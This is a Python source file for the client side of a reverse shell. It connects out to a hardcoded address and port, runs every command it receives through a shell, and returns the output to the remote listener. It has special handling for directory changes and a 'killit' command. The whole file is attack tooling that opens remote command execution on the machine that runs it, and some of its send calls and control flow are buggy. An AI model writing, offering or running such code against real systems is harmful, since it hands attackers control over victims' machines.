import os
import socket
import subprocess
import sys


# Initial creation of socket on the client device

s = socket.socket()
host = "192.168.1.15"
port = 9999
s.connect((host, port))

# After client connects to listening server, it keeps looping to recieve commands from it and executes them

while True:
    data = s.recv(1024)
    # 'cd' is a special case that needs to be handled properly to keep functionality and transmission stable
    if data[:].decode("utf-8") == "cd":
        try:
            os.chdir(os.path.dirname(sys.argv[0]))
        except OSError:
            s.send("Client is already in starting directory!" + str(os.getcwd()) + "> ")
    elif data[:3].decode("utf-8") == "cd ":
        try:
            # This line is causing issues, need to look into it and fix it within this branch
            os.chdir(data[3:].decode("utf-8"))
        except OSError:
            s.send("Directory does not exist: " + str.encode(str(OSError) + str(os.getcwd()) + "> "))
    # Personalised client side kill command, can't use 'kill' because that's already used by linux based OS
    elif data[:].decode("utf-8") == 'killit':
        s.send("Closing Connection...")
        s.close()
        break
    # Check is command is not 'cd' and more than 0 bytes,
    # This shouldn't fail because the server already has a check set up for this
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
        print(output_str)


# Closing Connection in case 'killit' command wasn't issued, otherwise unreachable
s.close()
